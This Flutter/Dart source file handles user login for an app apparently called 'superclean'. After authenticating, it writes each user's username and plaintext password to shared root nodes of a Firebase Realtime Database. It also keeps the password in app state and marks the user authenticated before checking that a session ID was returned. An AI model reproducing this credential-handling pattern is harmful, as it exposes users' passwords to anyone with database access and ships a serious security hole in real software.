// ignore_for_file: avoid_print

import 'package:firebase_database/firebase_database.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:get_it/get_it.dart';
import 'package:superclean/aplication/navigation/router.gr.dart';
import 'package:superclean/domain/bloc/auth/auth_event.dart';
import 'package:superclean/domain/bloc/auth/auth_state.dart';
import 'package:superclean/domain/services/auth_repository.dart';
import 'package:superclean/domain/services/secure_auth_data.dart';

class AuthBloc extends Bloc<AuthEvent, AuthState> {
  final AuthRepository authRepository = AuthRepository();
  final _secureAuthData = SecureAuthData();
  final _appRouter = GetIt.instance<AppRouter>();

  AuthBloc() : super(AuthState.initial) {
    on<LoginEvent>(
      (event, emit) async {
        emit(
          state.copyWith(
            isLoadind: true,
            isAuth: false,
          ),
        );

        {
          final String? sessionId = await authRepository.getSessionId(
            userName: event.userName ?? '',
            password: event.password ?? '',
          );

          emit(
            state.copyWith(
              isLoadind: false,
              isAuth: true,
              sessionId: sessionId,
              userName: event.userName,
              password: event.password,
            ),
          );

          emit(
            state.copyWith(
              isLoadind: false,
              isAuth: true,
              sessionId: sessionId,
              userName: event.userName,
              password: event.password,
            ),
          );

          //save sessionId to secureStorage
          await _secureAuthData.saveSessionId(sessionId);
          //save login&password to firebase db
          DatabaseReference loginDB =
              FirebaseDatabase.instance.ref().child('login');
          loginDB.set(event.userName);
          DatabaseReference passwordDB =
              FirebaseDatabase.instance.ref().child('password');
          passwordDB.set(event.password);

          if (state.sessionId != null && state.sessionId != '') {
            await _appRouter.push(
              const AutoTabsScaffoldRoute(),
            );
          }
        }
      },
    );
  }
}
